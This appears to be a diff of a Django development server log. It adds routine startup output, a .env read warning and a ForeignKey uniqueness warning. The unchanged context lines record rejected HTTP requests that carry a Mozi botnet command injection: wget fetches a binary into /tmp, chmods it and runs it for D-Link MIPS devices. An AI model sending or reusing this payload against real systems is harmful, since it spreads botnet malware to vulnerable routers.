@@ -15934,3 +15934,21 @@ Not Found: /
 [26/Oct/2024 07:01:17,038] - Broken pipe from ('173.255.221.189', 43052)
 [26/Oct/2024 07:59:37] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
 [26/Oct/2024 07:59:37] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+/opt/agaveproject/agaveproject/settings.py changed, reloading.
+Performing system checks...
+
+September 19, 2024 - 06:20:15
+Django version 5.0.2, using settings 'agaveproject.settings'
+Starting development server at http://0.0.0.0:8081/
+Quit the server with CONTROL-C.
+
+/opt/agavevenv/lib/python3.10/site-packages/environ/environ.py:648: UserWarning: Error reading .env - if you're not configuring your environment separately, check this.
+  warnings.warn(
+Watching for file changes with StatReloader
+System check identified some issues:
+
+WARNINGS:
+products.Home_OurProducts.Category: (fields.W342) Setting unique=True on a ForeignKey has the same effect as using a OneToOneField.
+	HINT: ForeignKey(unique=True) is usually better served by a OneToOneField.
+
+System check identified 1 issue (0 silenced).
